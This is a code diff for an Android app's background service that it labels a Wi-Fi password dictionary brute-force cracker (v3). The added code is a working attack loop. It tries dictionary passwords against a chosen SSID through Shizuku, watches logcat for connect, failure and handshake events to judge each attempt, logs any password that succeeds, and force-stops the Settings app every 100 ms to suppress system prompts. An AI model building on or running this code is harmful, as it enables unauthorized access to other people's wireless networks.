@@ -1,34 +1,24 @@
 package com.wifi.toolbox.services
 
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.PendingIntent
-import android.app.Service
+import android.app.*
 import android.content.Intent
-import android.os.Build
-import android.os.IBinder
+import android.os.*
 import androidx.compose.runtime.snapshotFlow
 import androidx.core.app.NotificationCompat
-import com.wifi.toolbox.MyApplication
-import com.wifi.toolbox.R
-import com.wifi.toolbox.structs.PojieRunInfo
-import com.wifi.toolbox.structs.SinglePojieTask
+import com.wifi.toolbox.*
+import com.wifi.toolbox.structs.*
 import com.wifi.toolbox.ui.MainActivity
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.cancel
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.isActive
-import kotlinx.coroutines.launch
+import com.wifi.toolbox.utils.ShizukuUtil
+import kotlinx.coroutines.*
+import kotlin.coroutines.resume
 
 class PojieService : Service() {
 
     private val NOTIFICATION_CHANNEL_ID = "PojieServiceChannel"
-    private val NOTIFICATION_ID = 1
+
     private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
 
+    private var logcatService = WifiLogcatService()
 
     private fun calculatePriority(task: PojieRunInfo): Long {
         val currentTime = System.currentTimeMillis()
@@ -39,8 +29,64 @@ class PojieService : Service() {
     }
 
     private suspend fun performTaskLogic(app: MyApplication, task: SinglePojieTask): Int {
-        delay(3000)
-        return SinglePojieTask.RESULT_FAILED
+        val startTime = System.currentTimeMillis()
+
+        ShizukuUtil.connectToWifi(task.ssid, task.password)
+
+        return withTimeoutOrNull(timeMillis = app.pojieConfig.maxTryTime.toLong()) {
+            suspendCancellableCoroutine<Int> { continuation ->
+                val collectJob = launch {
+                    logcatService.logFlow.collect { data ->
+                        if (continuation.isActive) {
+                            if (data.ssid == task.ssid && data.eventStartTime >= startTime) {
+
+                                //app.logState.addLog(data.toString())
+
+                                when (data.event) {
+                                    WifiLogData.EVENT_WIFI_CONNECTED -> {
+                                        continuation.resume(SinglePojieTask.RESULT_SUCCESS)
+                                        cancel()
+                                    }
+
+                                    WifiLogData.EVENT_CONNECT_FAILED -> {
+                                        continuation.resume(SinglePojieTask.RESULT_FAILED)
+                                        cancel()
+                                    }
+
+                                    WifiLogData.EVENT_HANDSHAKE -> {
+                                        when (app.pojieConfig.failureFlag) {
+                                            1 -> if (data.handshakeUseTime > app.pojieConfig.timeout) {
+                                                continuation.resume(SinglePojieTask.RESULT_FAILED)
+                                                cancel()
+                                            }
+
+                                            2 -> {
+                                                if (data.handshakeCount > app.pojieConfig.maxHandshakeCount) {
+                                                    continuation.resume(SinglePojieTask.RESULT_FAILED)
+                                                    cancel()
+                                                }
+                                            }
+
+                                        }
+                                    }
+
+                                    else -> {
+                                        continuation.resume(SinglePojieTask.RESULT_UNKNOWN)
+                                        cancel()
+                                    }
+                                }
+                            } else {
+                                app.logState.addLog("W: 信息不匹配")
+                            }
+                        }
+                    }
+                }
+
+                continuation.invokeOnCancellation {
+                    collectJob.cancel()
+                }
+            }
+        } ?: SinglePojieTask.RESULT_TIMEOUT
     }
 
     private var currentWorkerJob: Job? = null
@@ -58,22 +104,15 @@ class PojieService : Service() {
             putExtra("target", "Pojie")
         }
         val pendingIntent = PendingIntent.getActivity(
-            this,
-            0,
-            notificationIntent,
-            PendingIntent.FLAG_IMMUTABLE
+            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
         )
 
         val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-            .setContentTitle("密码字典破解服务")
-            .setContentText("运行中...")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .setContentIntent(pendingIntent)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .build()
+            .setContentTitle("密码字典破解服务").setContentText("运行中...")
+            .setSmallIcon(R.drawable.ic_launcher_foreground).setContentIntent(pendingIntent)
+            .setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build()
 
-        startForeground(NOTIFICATION_ID, notification)
+        startForeground(1, notification)
 
         if (currentWorkerJob == null && currentWorkingSsid == null) {
             val app = applicationContext as MyApplication
@@ -86,7 +125,7 @@ class PojieService : Service() {
   \___/|___/_| |_| |_| |_|\__, |\__\__, |
                           |___/    |___/ 
 ==========================================
-wifi密码暴力破解工具v2 for Android
+wifi密码暴力破解工具 v3 for Android
 """
             )
             startServiceLogic()
@@ -95,20 +134,30 @@ wifi密码暴力破解工具v2 for Android
         return START_STICKY
     }
 
-    private fun startServiceLogic() {
-        serviceScope.launch {
-            val app = applicationContext as MyApplication
+    var lastTrySsid: String? = null
 
+    private fun startServiceLogic() {
+        val app = applicationContext as MyApplication
+
+        serviceScope.launch {
+            while (isActive) {
+                //注：专门针对某些设备密码错误就不管什么页面都弹窗的反人类设计
+                //但是运行期间打不开设置应用，所以TODO加个开关
+                ShizukuUtil.executeCommandSync("am force-stop com.android.settings")
+                delay(100)
+            }
+        }
+
+        serviceScope.launch {
             launch {
-                snapshotFlow { app.runningPojieTasks.toList() }
-                    .collect { currentList ->
-                        val targetSsid = currentWorkingSsid
-                        if (targetSsid != null) {
-                            if (currentList.none { it.ssid == targetSsid }) {
-                                currentWorkerJob?.cancel()
-                            }
+                snapshotFlow { app.runningPojieTasks.toList() }.collect { currentList ->
+                    val targetSsid = currentWorkingSsid
+                    if (targetSsid != null) {
+                        if (currentList.none { it.ssid == targetSsid }) {
+                            currentWorkerJob?.cancel()
                         }
                     }
+                }
             }
 
             while (isActive) {
@@ -141,10 +190,14 @@ wifi密码暴力破解工具v2 for Android
                 var taskResult = -1
 
                 currentWorkerJob = launch {
+                    if (task.ssid != lastTrySsid) {
+                        lastTrySsid = task.ssid
+                        ShizukuUtil.disconnectWifi()
+                        delay(500)
+                    }
                     taskResult = performTaskLogic(
                         app, SinglePojieTask(
-                            ssid = task.ssid,
-                            password = currentPass
+                            ssid = task.ssid, password = currentPass
                         )
                     )
                 }
@@ -158,6 +211,12 @@ wifi密码暴力破解工具v2 for Android
                 } else {
                     app.logState.setLine("尝试: (${task.ssid}, $currentPass) 结果: $taskResult")
                     processTaskCompletion(app, task.ssid)
+                }
+                if (taskResult == 0) {
+                    app.logState.addLog("连接成功: (${task.ssid}, $currentPass)")
+                    ShizukuUtil.disconnectWifi()
+                    app.stopTask(task.ssid)
+                    delay(2000)
                 }
 
                 currentWorkingSsid = null
@@ -185,9 +244,7 @@ wifi密码暴力破解工具v2 for Android
     }
 
     private fun updateTaskState(
-        app: MyApplication,
-        ssid: String,
-        transform: (PojieRunInfo) -> PojieRunInfo
+        app: MyApplication, ssid: String, transform: (PojieRunInfo) -> PojieRunInfo
     ) {
         val index = app.runningPojieTasks.indexOfFirst { it.ssid == ssid }
         if (index != -1) {
@@ -204,9 +261,7 @@ wifi密码暴力破解工具v2 for Android
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val serviceChannel = NotificationChannel(
-                NOTIFICATION_CHANNEL_ID,
-                "密码字典破解服务",
-                NotificationManager.IMPORTANCE_MIN
+                NOTIFICATION_CHANNEL_ID, "密码字典破解服务", NotificationManager.IMPORTANCE_MIN
             )
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(serviceChannel)
